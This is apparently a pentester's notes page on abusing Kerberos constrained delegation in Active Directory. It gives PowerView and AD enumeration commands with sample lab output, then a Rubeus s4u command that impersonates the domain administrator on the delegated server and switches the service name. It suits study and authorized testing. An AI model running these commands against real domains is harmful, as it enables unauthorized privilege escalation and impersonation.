# Constrained delegation

Constrained delegation (CD) is similar to [unconstrained-delegation.md](unconstrained-delegation.md "mention"), but in this case the server that has CD can delegate a Kerberos ticket to only a subset of services.

This property is written in the attribute `msDS-AllowedToDelegateTo`.

## List devices that support CD

```powershell
[PowerView]> Get-DomainUser -TrustedToAuth
[PowerView]> Get-DomainComputer -TrustedToAuth
> Get-ADObject -Filter { msDS-AllowedToDelegateTo -ne "$null" } -Properties msDS-AllowedToDelegateTo
DistinguishedName        : CN=appsvc,CN=Users,DC=us,DC=techcorp,DC=local
msDS-AllowedToDelegateTo : {CIFS/us-mssql.us.techcorp.local, CIFS/us-mssql}
Name                     : appsvc
ObjectClass              : user
ObjectGUID               : 4f66bb3a-d07e-40eb-83ae-92abcb9fc04c
```

This means that the user `appsvc` has constrained delegation to the server `US-MSSQL` on the SMB service (CIFS).

If I compromise the `appsvc` user, I can access the `CIFS` service of `us-mssql` as any user of the domain.

## Impersonate privileged user

The user `appsvc` can impersonate any user on the machine `US-MSSQL`. It is even possible to change the service that we want to use, using [s4u.md](s4u.md "mention"):

```powershell
> .\Rubeus.exe s4u /user:appsvc /aes256:<key> /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt
```

_Note: if you only have password of user account, generate hash with `Rubeus hash`._

For cross-domain impersonations (i.e. through trust) specify correct dc with `/dc:<dc>`.

It is then possible to authenticate to `US-MSSQL` ([ad-authentication.md](../misc/ad-authentication.md "mention")) we have domain admin privileges on this machine but we are limited to this machine.
